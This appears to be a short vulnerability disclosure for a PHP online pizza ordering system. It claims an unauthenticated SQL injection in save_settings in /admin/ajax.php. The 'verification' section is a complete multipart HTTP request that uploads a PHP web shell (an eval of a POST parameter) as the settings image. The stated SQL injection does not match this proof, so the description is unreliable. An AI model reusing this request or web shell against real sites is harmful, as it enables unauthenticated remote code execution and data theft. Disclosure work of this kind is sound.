

The Online Pizza Ordering System has an SQL injection vulnerability, which can be exploited by an attacker to steal information or corrupt a database without authentication.



Source code address：https://www.sourcecodester.com/php/16166/online-pizza-ordering-system-php-free-source-code.html



The vulnerability is located in save_settings in the /admin/ajax.php file, and you can see in the code snippet that the parameters passed in are directly concatenated with the SQL statement.

![image-20250326232545624](images/image-20250326232545624.png)





Vulnerability verification：

```
POST /php-opos/admin/ajax.php?action=save_settings HTTP/1.1
Host: 192.168.80.152
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
DNT: 1
Connection: keep-alive
Content-Type: multipart/form-data; boundary=---------------------------145383211625062
Content-Length: 698

-----------------------------145383211625062
Content-Disposition: form-data; name="name"

Online Pizza Ordering System - PHP
-----------------------------145383211625062
Content-Disposition: form-data; name="email"

info@abcpizaa.com
-----------------------------145383211625062
Content-Disposition: form-data; name="contact"

0912654789
-----------------------------145383211625062
Content-Disposition: form-data; name="about"

11
            
-----------------------------145383211625062
Content-Disposition: form-data; name="img"; filename="opos22.php"
Content-Type: application/octet-stream

<?php
eval($_POST["pass1"]);

-----------------------------145383211625062--

```

 ![image-20250326232521513](images/image-20250326232521513.png)



































